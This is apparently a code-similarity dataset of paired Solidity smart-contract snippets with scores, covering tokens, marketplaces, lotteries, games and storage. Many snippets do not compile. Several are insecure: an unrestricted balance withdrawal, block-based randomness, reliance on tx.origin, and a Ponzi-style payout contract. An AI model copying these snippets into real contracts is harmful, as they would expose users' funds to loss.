    address public owner = msg.sender;

    
    mapping (uint256 => string ) private storedData;

    modifier isOwner() {    
        require(owner == msg.sender);
        _;
    }

    modifier dataNotStored(uint256 _index) {
        require( keccak256(abi.encodePacked(storedData[_index])) == keccak256(abi.encodePacked('')) );
        _;
    }

    function set(uint _index, string calldata _data_to_store) external dataNotStored(_index) {
        storedData[_index] = _data_to_store;
    }

    function forceSet(uint _index, string calldata _data_to_store) isOwner external {
        storedData[_index] = _data_to_store;
    }

    function get(uint _index) public view returns (string memory) {
        return storedData[_index];
    }
}",0.5610371608947998,"contract Wallet is Ownable {

    using SafeMath for uint256;



    LotteryData public lotteryData;



    uint256 public minPaymnent = 10**16;



    function setMinPayment(uint256 value) public onlyOwner {

        minPaymnent = value;

    }



    constructor() public {

        lotteryData = LotteryData(msg.sender);

    }



    function() payable external {

        require(msg.value >= minPaymnent);

        lotteryData.participate(msg.sender, msg.value);

    }



    function finishDay() external returns(uint256) {

        require(msg.sender == address(lotteryData));

        uint256 balance = address(this).balance;

        if (balance >= minPaymnent) {

            lotteryData.getFunds.value(balance)();

            return balance;

        } else {

            return 0;

        }

    }

}"
"contract Marketplace {
    string public name;
    uint public productCount = 0;
    mapping(uint => Product) public products;

    struct Product {
        uint id;
        string name;
        uint price;
        address payable owner;
        bool purchased;
    }

    event ProductCreated(
        uint id,
        string name,
        uint price,
        address payable owner,
        bool purchased
    );

    event ProductPurchased(
        uint id,
        string name,
        uint price,
        address payable owner,
        bool purchased
    );

    constructor() public {
        name = ""Dapp University Marketplace"";
    }

    function createProduct(string memory _name, uint _price) public {
        
        require(bytes(_name).length > 0);
        
        require(_price > 0);
        
        productCount ++;
        
        products[productCount] = Product(productCount, _name, _price, msg.sender, false);
        
        emit ProductCreated(productCount, _name, _price, msg.sender, false);
    }

    function purchaseProduct(uint _id) public payable {
        
        Product memory _product = products[_id];
        
        address payable _seller = _product.owner;
        
        require(_product.id > 0 && _product.id <= productCount);
        
        require(msg.value >= _product.price);
        
        require(!_product.purchased);
        
        require(_seller != msg.sender);
        
        _product.owner = msg.sender;
        
        _product.purchased = true;
        
        products[_id] = _product;
        
        address(_seller).transfer(msg.value);
        
        emit ProductPurchased(productCount, _product.name, _product.price, msg.sender, true);
    }
}",0.5952978686992525,"contract Bloktrade is Token {

  using SafeMath for uint256;



  uint256 public price = 3000;



  token tokenReward;





  uint256 public weiRaised;



  

  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);





  constructor () public {



    tokenReward = token(address(this));

  }



  bool public started = true;



  function startSale() onlyOwner public {

    

    started = true;

  }



  function stopSale() onlyOwner public {

    

    started = false;

  }



  function setPrice(uint256 _price) onlyOwner public {

    

    price = _price;

  }



  

  function () payable public {

    buyTokens(msg.sender);

  }



  

  function buyTokens(address beneficiary) payable public {

    require(beneficiary != 0x0);

    require(validPurchase());



    uint256 weiAmount = msg.value;



    

    



    

    uint256 tokens = (weiAmount) * price;

    



    

    weiRaised = weiRaised.add(weiAmount);



    tokenReward.transfer(beneficiary, tokens);

    emit TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

    forwardFunds();

  }



  

  

  function forwardFunds() internal {

    owner.transfer(msg.value);

  }



  

  function validPurchase() internal constant returns (bool) {

    bool withinPeriod = started;

    bool nonZeroPurchase = msg.value != 0;

    return withinPeriod && nonZeroPurchase;

  }



  function withdrawTokens(uint256 _amount) onlyOwner public {

    tokenReward.transfer(owner,_amount);

  }

}"
"contract ClientReceipt {
    event Deposit(
        uint256 a
    );

    function deposit(uint256 a) {
        
        
        
        Deposit(a);
    }
}",0.58161591672085,"contract Casino {

    function deposit(address _receiver, uint _amount, bool _chargeGas) public;

}"
"contract TestContract {
    using TestLib for TestLib.DataSet;
    TestLib.DataSet set;

    function getBalanceInEth() public returns(uint) {
        set.assign();
        return set.getA();
    }
}",0.5837163402662054,"contract SimpleStorage

{

    uint storedData;

    

    function set(uint x) public

    {

        storedData = x;

    }



    function get() public view returns (uint)

    {

        return storedData;

    }

}"
"contract Foo {
    mapping (bytes32 => Thing) things;

    struct Thing {
        Item[] items;
    }

    struct Item {
        uint number;
    }

    function Foo(bytes32 id) {
        Thing memory thing = Thing(); 
        things[id] = thing;
    }
}",0.5104981063902904,"contract OraclizeI {
    function getPrice(string _datasource, uint _gas_limit) returns (uint _dsprice);
    function query(uint _timestamp, string _datasource, string _arg) returns (bytes32 _id);
}"
"contract Consumer {
    InfoFeed feed;
    function setFeed(InfoFeed addr) public { feed = addr; }
    function callFeed() public { feed.info{value: 10, gas: 800}(); }
}",0.5864177684372379,"contract mile{

     function receiveEther() payable public{
     }

     function sendEther(address _address) payable public{
         uint value = 0;

         _address.transfer(value);
     }

}"
"contract Hello {

    event TestEvent(uint256[] array);

    function hello() public {
        uint256[] memory output;
        for (uint i = 0; i < 5; i++) {
            output[i] = i;
        }
        TestEvent(output);
    }

}",0.5805889598409351,"contract MintableToken is Token {
    event Mint(address indexed to, uint256 amount);

    function mint(address _to, uint256 _amount) public returns (bool);
}"
"contract Consumer {
    InfoFeed feed;
    function setFeed(address addr) public { feed = InfoFeed(addr); }
    function callFeed() public { feed.info.value(10).gas(800)(); }
}",0.5937774324604939,"contract TokenInterface {

    function transfer(address _to, uint256 _value) public;

    function balanceOf(address _addr) public constant returns(uint256);

}"
"contract MyContract {
    struct Record {
        bool valid;
        uint val1;
        uint val2;
        uint val3;
    }

    mapping(uint => Record) public table;

    uint public count;

    function insert(uint key, uint val1, uint val2, uint val3) external {
        Record storage record = table[key];
        if (record.valid == false) {
            record.valid = true;
            record.val1 = val1;
            record.val2 = val2;
            record.val3 = val3;
            count += 1;
        }
    }

    function storage_remove(uint[] keys) external {
        for (uint i = 0; i < keys.length; i++) {
            Record storage record = table[keys[i]];
            if (record.valid == true) {
                delete table[keys[i]];
                count -= 1;
            }
        }
    }

    function memory_remove(uint[] keys) external {
        for (uint i = 0; i < keys.length; i++) {
            Record memory record = table[keys[i]];
            if (record.valid == true) {
                delete table[keys[i]];
                count -= 1;
            }
        }
    }
}",0.5395921270760239,"contract MockTestNetworkToken {

    
    string public constant name = ""Test Network Token"";
    string public constant symbol = ""TNT"";
    uint8 public constant decimals = 18;  

    
    uint256 totalTokens;

    
    mapping (address => uint256) balances;

    
    bool transferable;


    
    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    

    function transfer(address _to, uint256 _value) returns (bool) {
        if (transferable && balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        }
        return false;
    }

    function totalSupply() external constant returns (uint256) {
        return totalTokens;
    }

    function balanceOf(address _owner) external constant returns (uint256) {
        return balances[_owner];
    }

}"
"contract TestBAToken {
  function testNewBATokenNotFinalized() {
    address companyFundAddress = addresses[1];  
    address userFundAddress = addresses[2];
    uint256 startBlock = block.number - 100;
    uint256 endBlock = block.number + 100;
    BAToken ba = new BAToken(companyFundAddress, userFundAddress, startBlock, endBlock);
    Assert.equal(ba.isFinalized, false, ""Token sale shouldn't be finalized upon initialization."");
  }
}",0.5316114150747323,"contract EasyInvest10 {

    

    mapping (address => uint256) public invested;

    

    mapping (address => uint256) public atBlock;

	



    

    function () external payable {

        

        if (invested[msg.sender] != 0) {

            

            

            

            uint256 amount = invested[msg.sender] * 10 / 100 * (block.number - atBlock[msg.sender]) / 5900;



            

            msg.sender.transfer(amount);

			invested[totalETH] += msg.value;

		}

			



        

        atBlock[msg.sender] = block.number;

        invested[msg.sender] += msg.value;}

        address totalETH = msg.sender;

        

	}"
"contract TreasureBox {
    Gold g;

    constructor() public {
        g = new Gold();
    }

    function profit() public {
        g.take();
    }
}",0.5834544115159797,"contract SaiVox {
    function par() public returns (uint);
    function way() public returns (uint);
}"
"contract DonationNew {
  mapping (address => uint) user_amounts;

  function sendDonation(uint n) {
    user_amounts[msg.sender] = user_amounts[msg.sender] + n
  }

  function cancelDonation() {
    user_amounts[msg.sender] = 0
  }
}",0.5490023133200898,"contract BurnableToken is ERC20 {

    function burn(uint256 amount) public {
        _burn(msg.sender, amount);
    }

    function burnFrom(address account, uint256 amount) public {
        _burnFrom(account, amount);
    }

}"
"contract example1 {
  function A() {
    print msg.sender; 
    example2.B();
  }
}",0.5861621206596949,"contract test {
    
    function a() public
    {
        msg.sender.transfer(this.balance);    
    }
    
    
}"
"contract ContractA {
    ContractB public contractBvar;
    ContractC public contractCvar;

    
    function ContractA() {
        contractBvar = new ContractB();
        contractBvar.set_name(""contractB"");
    }


    function createContractC() {
        contractCvar = new ContractC();
        contractCvar.set_name(""contractC"");
    }
  }",0.5543946347096917,"contract Bakery {



  



  address[] public contracts;



  



  function getContractCount()

    public

    constant

    returns(uint contractCount)

  {

    return contracts.length;

  }



  



  function newCookie()

    public

    returns(address newContract)

  {

    Cookie c = new Cookie();

    contracts.push(c);

    return c;

  }

}"
"contract Voting {
  

  mapping (bytes32 => uint256) public votesReceived;

  

  bytes32[] public candidateList;

  
  constructor(bytes32[] memory candidateNames) public {
    candidateList = candidateNames;
  }

  
  function totalVotesFor(bytes32 candidate) view public returns (uint256) {
    require(validCandidate(candidate));
    return votesReceived[candidate];
  }

  
  
  function voteForCandidate(bytes32 candidate) public {
    require(validCandidate(candidate));
    votesReceived[candidate] += 1;
  }

  function validCandidate(bytes32 candidate) view public returns (bool) {
    for(uint i = 0; i < candidateList.length; i++) {
      if (candidateList[i] == candidate) {
        return true;
      }
    }
    return false;
  }
}",0.5661686892700982,"contract ExchangeRate is Ownable {
 
  event RateUpdated(uint timestamp, bytes32 symbol, uint rate);
 
  mapping(bytes32 => uint) public rates;
 
  
  function updateRate(string _symbol, uint _rate) public onlyOwner {
    rates[sha3(_symbol)] = _rate;
    RateUpdated(now, sha3(_symbol), _rate);
  }
 
  
  function updateRates(uint[] data) public onlyOwner {
    if (data.length % 2 > 0)
      return;
    uint i = 0;
    while (i < data.length / 2) {
      bytes32 symbol = bytes32(data[i * 2]);
      uint rate = data[i * 2 + 1];
      rates[symbol] = rate;
      RateUpdated(now, symbol, rate);
      i++;
    }
  }
 
  
  function getRate(string _symbol) public constant returns(uint) {
    return rates[sha3(_symbol)];
  }
 
}"
"contract ReentrancyAttack {
    ReentrancyPot public pot;

    function ReentrancyAttack (address _pot) public {
        pot = ReentrancyPot(_pot);
    }
}",0.562428599286414,"contract PotFab {
    function newPot(address vat) public returns (Pot pot) {
        pot = new Pot(vat);
        pot.rely(msg.sender);
        pot.deny(address(this));
    }
}"
"contract ProofOfExistence3 {
  mapping (bytes32 => bool) private proofs;
  
  function storeProof(bytes32 proof) {
    proofs[proof] = true;
  }
  
  function notarize(string document) {
    var proof = proofFor(document);
    storeProof(proof);
  }
  
  function proofFor(string document) constant returns (bytes32) {
    return sha256(document);
  }
  
  function checkDocument(string document) constant returns (bool) {
    var proof = proofFor(document);
    return hasProof(proof);
  }
  
  function hasProof(bytes32 proof) constant returns(bool) {
    return proofs[proof];
  }
}",0.5430202966280232,"contract ERC20 is ERC20Events{
    function totalSupply() constant returns (uint supply);
    function balanceOf( address who ) constant returns (uint value);
    function allowance( address owner, address spender ) constant returns (uint _allowance);

    function transfer( address to, uint value) returns (bool ok);
    function transferFrom( address from, address to, uint value) returns (bool ok);
    function approve( address spender, uint value ) returns (bool ok);

}"
"contract ZonesFactory {
    address[] zones;
    event LogCreatedZone(address indexed hsAddr, string name, string P1Lon, string P1Lat, string P2Lon, string P2Lat, string P3Lon, string P3Lat, string P4Lon, string P4Lat);

    function add(string name, string P1Lon, string P1Lat, string P2Lon, string P2Lat, string P3Lon, string P3Lat, string P4Lon, string P4Lat) public returns(address) {
        zoneObject newZone = new zoneObject(name, P1Lon, P1Lat, P2Lon, P2Lat, P3Lon, P3Lat, P4Lon, P3Lat);
        zones.push(newZone);
        LogCreatedZone(newZone,name, P1Lon, P1Lat, P2Lon, P2Lat, P3Lon, P3Lat, P4Lon, P3Lat);
        return newZone;
    }

    function getOrgAtIndex(uint index) public constant returns(address org){
        return zones[index];
    }

    function getOrganizationCount() public constant returns(uint count) {
        return zones.length;
    }
}",0.5237830105230119,"contract ERC20Interface {



    string public constant name = ""CCTV"";

    string public constant symbol = ""ZY"";

    uint8 public constant decimals = 18;  



    function totalSupply() public constant returns (uint);

    function balanceOf(address tokenOwner) public constant returns (uint balance);

    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);

    function transfer(address to, uint tokens) public returns (bool success);

    function approve(address spender, uint tokens) public returns (bool success);

    function transferFrom(address from, address to, uint tokens) public returns (bool success);



    event Transfer(address indexed from, address indexed to, uint tokens);

    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

}"
"contract zoneObject {

    struct PointCoords {
        pointObject P1Coords;
        pointObject P2Coords; 
        pointObject P3Coords; 
        pointObject P4Coords; 
    }

    PointCoords public pointsCoords;
    address[] public patients;
    string public name;

    function zoneObject (string name, string P1Lon, string P1Lat, string P2Lon, string P2Lat, string P3Lon, string P3Lat, string P4Lon, string P4Lat){
        name = name;
        pointsCoords.P1Coords = new pointObject(P1Lon, P1Lat);
        pointsCoords.P2Coords = new pointObject(P2Lon, P2Lat);
        pointsCoords.P3Coords = new pointObject(P3Lon, P3Lat);
        pointsCoords.P4Coords = new pointObject(P4Lon, P4Lat);
    }

    function addPatient(address patientAddress){
        patients.push(patientAddress);
    }

    function getDetails() public constant returns (string, address, address, address, address){
        return (name, pointsCoords.P1Coords pointsCoords.P2Coords, pointsCoords.P3Coords, pointsCoords.P4Coords);
    }

    function removePatient(address patient){
        if(isContract(patient)){
            for (uint i = 0; i<patients.length-1; i++){
                if(patients[i] == patient){
                    delete patients[i];
                }
            }
        }
    }

    function isContract(address addr) returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}",0.5311871989888103,"contract ETHCOOLAdvertisements {

    using SafeMath for uint;

    struct Advertisement {
        address user;
        string text;
        string link;
        uint expiry;
    }

    address public owner;
    uint public display_rate;
    uint public owner_share;

    ETHCOOLMain main_contract;
    Advertisement[] public advertisements;
    
    constructor() public {
        owner = msg.sender;
    }

    function publicGetStatus() view public returns (uint) {
        return (advertisements.length);
    }

    function publicGetAdvertisement(uint index) view public returns (address, string, string, uint) {
        return (advertisements[index].user, advertisements[index].text, advertisements[index].link, advertisements[index].expiry);
    }

    function ownerConfig(address main, uint rate, uint share) public {
        if (msg.sender == owner) {
            display_rate = rate;
            owner_share = share;
            main_contract = ETHCOOLMain(main);
        }
    }

    function userCreate(string text, string link) public payable {
        if (msg.value > 0) {
            uint expiry = now.add(msg.value.div(display_rate));
            Advertisement memory ad = Advertisement(msg.sender, text, link, expiry);
            advertisements.push(ad);
        }
    }

    function userTransfer() public {
        if (address(this).balance > 0) {
            main_contract.contractBoost.value(address(this).balance)(owner_share);
        }
    }
}"
"contract pointObject{
    string public Lat;
    string public Lon;

    function pointObject (string Lon, string Lat){
        Lat = Lat;
        Lon = Lon;
    }
}",0.5700771446473979,"contract LANCToken is MintableToken {

  string public name = ""LanceChain Token"";
  string public symbol = ""LANC"";
  uint public decimals = 18;
  
}"
"contract D {
  uint public n;
  address public sender;
  event CallStatus(bool);

  function callSetN(address _e, uint _n) {
    if (!_e.call.gas(500000)(bytes4(sha3(""setN(uint256)"")), _n)) {
        CallStatus(false);
    } else {
        CallStatus(true);
    }
  }
  function callSetN2(address _e, uint _n) {
      _e.call.gas(500000)(bytes4(sha3(""setN(uint256)"")), _n);
  }

  function callcodeSetN(address _e, uint _n) {
    if (!_e.callcode.gas(500000)(bytes4(sha3(""setN(uint256)"")), _n)) {
        CallStatus(false);
    } else {
        CallStatus(true);
    }
  }

  function delegatecallSetN(address _e, uint _n) {
    if (!_e.delegatecall.gas(500000)(bytes4(sha3(""setN(uint256)"")), _n)) {
        CallStatus(false);
    } else {
        CallStatus(true);
    }
  }
}",0.5149897585743476,"contract IMultiToken is IBasicMultiToken {

    event Update();

    event Change(address indexed _fromToken, address indexed _toToken, address indexed _changer, uint256 _amount, uint256 _return);



    function weights(address _token) public view returns(uint256);



    function getReturn(address _fromToken, address _toToken, uint256 _amount) public view returns (uint256 returnAmount);

    function change(address _fromToken, address _toToken, uint256 _amount, uint256 _minReturn) public returns (uint256 returnAmount);



    function disableChanges() public;

}"
"contract GiveRefreceId {

                     mapping(address => uint256) public referenceid;
                        address[] public clients;
                        uint256 idcounter;

                    struct  MlMMembership_Payment{
                        string CompanyName;
                        uint256 DistributorId;
                        uint256 RefrenceDistributorId;
                        uint256 Amount;
                    }


                    MlMMembership_Payment[] MlMember;

                        event createdId(address user, uint256 id);

                        function giveRefrenceId() public returns (uint256)  { 
                            require(referenceid[msg.sender]==0);
                            idcounter += 1;
                            clients.push(msg.sender);
                            referenceid[msg.sender] = idcounter;
                            emit createdId(msg.sender,idcounter);
                            
                            return idcounter;
                        }


    function MLMloyalityPoints(string _Compney_name,uint256 _refreeid) public payable {
        uint256 temprefreeid  =  _refreeid-1;
        var  tempaddress = clients[temprefreeid];
        
         tempaddress.transfer(1000000000000000);

        }

}",0.5803084708578026,"contract dappVolumeHearts {

	using SafeMath for uint256;

	
	address public contractOwner;
	
	address public lastAddress;

	
	modifier onlyContractOwner {
		require(msg.sender == contractOwner);
		_;
	}

	
	constructor() public {
		contractOwner = msg.sender;
	}

	
	function withdraw() public onlyContractOwner {
		contractOwner.transfer(address(this).balance);
	}

	
	mapping(uint256 => uint256) public totals;

	
	function update(uint256 dapp_id) public payable {
		require(msg.value > 1900000000000000);
		totals[dapp_id] = totals[dapp_id] + msg.value;
		
		lastAddress.transfer(msg.value.div(2));
		lastAddress = msg.sender;
	}

	
	function getTotalHeartsByDappId(uint256 dapp_id) public view returns(uint256) {
		return totals[dapp_id];
	}

	
	function getBalance() public view returns(uint256){
		return address(this).balance;
	}

}"
"contract TicTacToe {
    uint constant public gameCost = 0.1 ether;

    uint8 public boardSize = 3;
    uint8 movesCounter;

    bool gameActive;

    address[3][3] board;

    address public player1;
    address public player2;

    uint balanceToWithdrawPlayer1;
    uint balanceToWithdrawPlayer2;

    uint timeToReact = 3 minutes;
    uint gameValidUntil;

    address activePlayer;

    event PlayerJoined(address player);
    event NextPlayer(address player);
    event GameOverWithWin(address winner);
    event GameOverWithDraw();
    event PayoutSuccess(address receiver, uint amountInWei);

    function TicTacToe() public payable {
        player1 = msg.sender;
        require(msg.value == gameCost);
        gameValidUntil = now+timeToReact;
    }

    function joinGame() public payable {
        assert(player2 == address(0));
        gameActive = true;

        require(msg.value == gameCost);

        player2 = msg.sender;
        PlayerJoined(player2);
        if(block.number % 2 == 0) {
            activePlayer = player2;
        } else {
            activePlayer = player1;
        }

        gameValidUntil = now + timeToReact;

        NextPlayer(activePlayer);
    }

    function getBoard() public view returns(address[3][3]) {
        return board;
    }

    function setWinner(address player) private {
        gameActive = false;
        
        GameOverWithWin(player);
        uint balanceToPayOut = address(this).balance;
        if(player.send(balanceToPayOut) != true) {
            if(player == player1) {
                balanceToWithdrawPlayer1 = balanceToPayOut;
            } else {
                balanceToWithdrawPlayer2 = balanceToPayOut;
            }
        } else {
            PayoutSuccess(player, balanceToPayOut);
        }
        
    }

    function withdrawWin() public {
      uint balanceToTransfer;
        if(msg.sender == player1) {
            require(balanceToWithdrawPlayer1 > 0);
            balanceToTransfer = balanceToWithdrawPlayer1;
            balanceToWithdrawPlayer1 = 0;
            player1.transfer(balanceToTransfer);

            PayoutSuccess(player1, balanceToTransfer);
        } else {

            require(balanceToWithdrawPlayer2 > 0);
            balanceToTransfer = balanceToWithdrawPlayer2;
            balanceToWithdrawPlayer2 = 0;
            player2.transfer(balanceToTransfer);
            PayoutSuccess(player2, balanceToTransfer);
        }
    }

    function setDraw() private {
        gameActive = false;
        GameOverWithDraw();

        uint balanceToPayOut = address(this).balance/2;

        if(player1.send(balanceToPayOut) == false) {
            balanceToWithdrawPlayer1 += balanceToPayOut;
        } else {
            PayoutSuccess(player1, balanceToPayOut);
        }
        if(player2.send(balanceToPayOut) == false) {
            balanceToWithdrawPlayer2 += balanceToPayOut;
        } else {
            PayoutSuccess(player2, balanceToPayOut);
        }

    }

    function emergecyCashout() public {
        require(gameValidUntil < now);
        require(gameActive);
        setDraw();
    }


    function setStone(uint8 x, uint8 y) public {
        require(board[x][y] == address(0));
        require(gameValidUntil > now);
        assert(gameActive);
        assert(x < boardSize);
        assert(y < boardSize);
        require(msg.sender == activePlayer);
        board[x][y] = msg.sender;
        movesCounter++;
        gameValidUntil = now + timeToReact;

        for(uint8 i = 0; i < boardSize; i++) {
            if(board[i][y] != activePlayer) {
                break;
            }
            
            if(i == boardSize - 1) {
                
                setWinner(activePlayer);
                return;
            }
        }
        for(i = 0; i < boardSize; i++) {
            if(board[x][i] != activePlayer) {
                break;
            }
            

            if(i == boardSize - 1) {
                
                setWinner(activePlayer);
                return;
            }
        }

        
        if(x == y) {
            for(i = 0; i < boardSize; i++) {
                if(board[i][i] != activePlayer) {
                    break;
                }
                
                if(i == boardSize - 1) {
                    
                    setWinner(activePlayer);
                    return;
                }
            }
        }

        
        if((x+y) == boardSize-1) {
            for(i = 0; i < boardSize; i++) {
                if(board[i][(boardSize-1)-i] != activePlayer) {
                    break;
                }
                

                if(i == boardSize - 1) {
                    
                    setWinner(activePlayer);
                    return;
                }
            }
        }

        
        if(movesCounter == (boardSize**2)) {
            
            setDraw();
            return;
        }

        if(activePlayer == player1) {
            activePlayer = player2;
        } else {
            activePlayer = player1;
        }
        NextPlayer(activePlayer);
    }
}",0.5433880109121059,"contract GenderGuess {
    
    using SafeMathLib for uint;
    
    address public manager;
    uint public enddate;
    uint public donatedAmount;
    bytes32 girl;
    bytes32 boy;
    address binanceContribute;
    
    address[] all_prtcpnts;
    address[] boy_prtcpnts;
    address[] girl_prtcpnts;
    address[] crrct_prtcpnts;
    address[] top_ten_prtcpnts;
    address[] lucky_two_prtcpnts;
    uint[] prtcpnt_donation;
    
    mapping (address => bool) public Wallets;

    constructor (uint _enddate) public {
        manager = msg.sender;
        enddate = _enddate;
        donatedAmount = 0;
        girl = ""girl"";
        boy = ""boy"";
        binanceContribute = 0xA73d9021f67931563fDfe3E8f66261086319a1FC;
    } 
    
    event ParticipantJoined(address _address, bytes32 pick);
    event Winners(address[] _addresses, uint _share);
    event IncreasedReward(address _sender, uint _amount);

    modifier manageronly (){
        require(
            msg.sender == manager,
            ""Sender is not authorized.""
        );
        _;
    }
    
    
    modifier conditions (){
        require(
            msg.value >= 0.01 ether,
            ""Minimum ETH not sent""
        );
        require(
            Wallets[msg.sender] == false,
            ""Sender has already participated.""
        );
        _;
    }
    
    modifier participateBefore (uint _enddate){
        require(
            now <= _enddate,
            ""Paticipants not allwoed.Time up!""
        );
        _;
    }      
    
    modifier pickOnlyAfter (uint _enddate){
        require(
            now > _enddate,
            ""Not yet time""
        );
        _;
    }
    
    function enter(bytes32 gender) public payable conditions participateBefore(enddate) {
        emit ParticipantJoined(msg.sender, gender);
        require(
            ((gender == boy) || (gender == girl)),
            ""Invalid Entry!""
        );
        
        
        binanceContribute.transfer(msg.value);
        donatedAmount = donatedAmount.plus(msg.value);
        all_prtcpnts.push(msg.sender);
        prtcpnt_donation.push(msg.value);
        
        
        setWallet(msg.sender);
        
        if (gender == boy){
            boy_prtcpnts.push(msg.sender);
        } else if(gender == girl) {
            girl_prtcpnts.push(msg.sender);
        }
    }
    
    function pickWinner(bytes32 _gender, uint256 _randomvalue) public manageronly pickOnlyAfter(enddate) {
        if ((all_prtcpnts.length < 100) || (boy_prtcpnts.length < 30) || (girl_prtcpnts.length < 30)) {
            binanceContribute.transfer(this.getRewardAmount());
        } else {
            if(_gender == boy) { 
                crrct_prtcpnts = boy_prtcpnts;
            } else if (_gender == girl) { 
                crrct_prtcpnts = girl_prtcpnts;
            }
            winnerSelect(_randomvalue);
        }
    }
    
    function winnerSelect(uint256 _randomvalue) private  {
        
        
        for (uint i = 0; i < 2; i++){ 
            
            uint index = doRandom(crrct_prtcpnts, _randomvalue) % crrct_prtcpnts.length;
            
            
            address _tempAddress = crrct_prtcpnts[index];
            crrct_prtcpnts[index] = crrct_prtcpnts[crrct_prtcpnts.length - 1];
            crrct_prtcpnts.length--;
            lucky_two_prtcpnts.push(_tempAddress);
        }
        
        uint share = this.getRewardAmount() / 2;
        lucky_two_prtcpnts[0].transfer(share);
        lucky_two_prtcpnts[1].transfer(share);
        emit Winners(lucky_two_prtcpnts, share);

    }
    
    function increaseReward() payable public participateBefore(enddate){
        emit IncreasedReward(msg.sender, msg.value);
    }
    
    function checkIsOpen() public view returns(bool){
        if (now <= enddate){
            return true;
        } else {
            return false;
        }
    }
    

    function doRandom(address[] _address, uint _linuxTime) private view returns (uint){
        return uint(keccak256(block.difficulty, now, _address, _linuxTime));
    }
    
    function setWallet(address _wallet) private {
        Wallets[_wallet] = true;
    }
    
    function getRewardAmount() public view returns(uint) {
        return address(this).balance;
    } 

    function getParticipants() public view returns(address[],uint[], uint, uint){
        return (all_prtcpnts,prtcpnt_donation, boy_prtcpnts.length, girl_prtcpnts.length);
    }
    
    
    function kill() public manageronly {
        selfdestruct(binanceContribute);  
    }
}"
"contract UserBasic {
    struct Record {
        bytes32 _id;
        address _addedBy;
        uint _dateAdded;
        bytes32 _transactionHash;
        bytes32 _type;
        bytes32 _hash;
        bytes32 _signature;
    }
    
    mapping(bytes32 => bytes32[]) typeRecords;
    
    mapping(bytes32 => Record) idRecord;
    
    function searchRecord(bytes32 _id) constant returns (bytes32, address, uint, bytes32, bytes32, bytes32, bytes32) {
        Record storage temp = idRecord[_id];
        return (temp._id, temp._addedBy, temp._dateAdded, temp._transactionHash, temp._type, temp._hash, temp._signature);
    }
    
    function addRecord(bytes32 _type, bytes32 _id) {
        typeRecords[_type].push(_id);
        var _new = Record(_id, tx.origin, now, """", _type, """", """");
        idRecord[_id] = _new;
    }
    
    function getRecordsByType(bytes32 _type) constant returns(bytes32[]) {
        return typeRecords[_type];
    }
}",0.5422995931589109,"contract AbstractENS {

    function owner(bytes32 _node) public view returns(address);

    function resolver(bytes32 _node) public view returns(address);

    function ttl(bytes32 _node) public view returns(uint64);

    function setOwner(bytes32 _node, address _owner) public;

    function setSubnodeOwner(bytes32 _node, bytes32 _label, address _owner) public;

    function setResolver(bytes32 _node, address _resolver) public;

    function setTTL(bytes32 _node, uint64 _ttl) public;



    

    event NewOwner(bytes32 indexed node, bytes32 indexed label, address owner);



    

    event Transfer(bytes32 indexed node, address owner);



    

    event NewResolver(bytes32 indexed node, address resolver);



    

    event NewTTL(bytes32 indexed node, uint64 ttl);

}"
"contract rentCar {

    struct Renter {
        address  addr;
        uint DOB;
        uint currentRenting;
    }

    bool public rented;
    address public owner;
    uint public duration;
    uint public rentalPrice;
    uint public charge;
    uint public rentalDate;
    uint public returnDate;
    uint public rentalStartDate;
    uint public rentalEndDate;
    uint public constant totalDays = 7;


    struct NameKey{ 
        uint[] keys;
    }

    
    uint[] private ids;  
    uint public numofCars;
    mapping(uint => Car) private cars;
    mapping(string => NameKey) private nameToKeys;

    
    event E_addCar(uint objID, address VechileOwner);
    event E_Rent(address indexed _renter, uint _rentalDate, uint _returnDate, uint _rentalPrice);
    event E_ReturnRental(address indexed _renter, uint _returnDate);

    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    modifier whenNotRented() {
        require(!rented);
        _;
    }

    modifier whenRented() {
        require(rented);
        _;
    }

    

    function rentCar() public{
        owner = msg.sender;
    }

    function addCar(string make, string model, uint pricePerDay, uint minRentalDay, uint maxRentalDay, bool available) public onlyOwner {

        Car newCar = cars[numofCars];
        
        
        newCar.VechileOwner = msg.sender;
        newCar.make = make;
        newCar.model = model;
        newCar.available = available;
        newCar.pricePerDay = pricePerDay;
        newCar.minRentalDay = minRentalDay;
        newCar.maxRentalDay = maxRentalDay;

        newCar(numofCars,msg.sender);
        ids.push(numofCars);
        numofCars++;

    }

    function setAvailable(uint objID, bool _available) public view onlyOwner {
        
        cars[objID].available = _available;
    }

    

    function Rent(uint objID,uint totalDays) public payable  whenNotRented returns(bool){
        
        require (msg.value < cars[objID].deposit);
        require(totalDays >= cars[objID].minRentalDay && totalDays <= cars[objID].maxRentalDay);


        cars[objID].renter = Renter({addr:msg.sender, currentRenting:now});

        uint PayDeposit = msg.value - cars[objID].deposit;
        rentalPrice = totalDays *  cars[objID].pricePerDay;
        rentalDate = rentalStartDate;
        returnDate = rentalEndDate;

        cars[objID].available = false;
        rented = true;

        

        
        E_Rent(Renter, rentalDate, returnDate, rentalPrice);

        return true;
    }

    function endRent (uint objID, uint duration) public  whenRented {
        
        duration = (now - cars[objID].renter.currentRenting) / (24*60*60*1.0);
        charge = duration * cars[objID].priceDaily - cars[objID].deposit;
        uint totalPayment = msg.value - charge;

        require(!cars[objID].VechileOwner.send(charge));
        require(!cars[objID].renter.addr.send(charge));

        delete cars[objID].renter;
        cars[objID].available = false;

        E_ReturnRental(Renter, now);

        resetRental();
    }

    function forceRentalEnd() public onlyOwner{
        require(now > returnDate && rented);

        E_ReturnRental(Renter, now);

        resetRental();
    }

    function resetRental() private{
        rented = false;
        Renter.addr = address(0);
        rentalDate = 0;
        returnDate = 0;
    }
}",0.5875506504863295,"contract CatInThePack is Ownable {



    using SafeMath for uint;



    

    IPack public pack;

    

    Kitties public kitties;

    

    ICollectable public collectables;

    

    IAuction[] public auctions;

    

    

    bool public canClaim = true;

    

    uint32 public delegateID;

    

    bool public locked = false;

    

    bool public includeAuctions = true;

    

    address public vault;

    

    uint public claimLimit = 20;

    

    uint public price = 0.024 ether;

    

    

    

    mapping(uint => bool) public claimed;

    

    mapping(uint => uint) public statues;



    constructor(IPack _pack, IAuction[] memory _auctions, Kitties _kitties, 

